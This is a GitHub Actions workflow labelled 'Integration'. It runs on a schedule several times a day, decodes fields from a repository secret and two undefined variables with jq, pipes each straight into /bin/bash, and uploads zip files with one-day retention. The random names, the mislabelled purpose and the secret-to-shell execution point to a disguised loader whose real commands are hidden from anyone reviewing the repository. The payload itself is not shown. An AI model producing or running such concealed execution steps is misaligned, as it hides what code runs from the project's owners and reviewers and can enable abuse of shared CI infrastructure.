name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '47 1,7,13,19 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          nmd225: ${{ secrets.nmd225 }}
        run: |
          printf '%s' "$nmd225" | jq -r .z3 | /bin/bash
          printf '%s' "$j60914" | jq -r .tu91 | /bin/bash
          echo $bnshi2 | jq -r .ofdsg34 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: r4w16VWy
          path: "*.zip"
          retention-days: 1
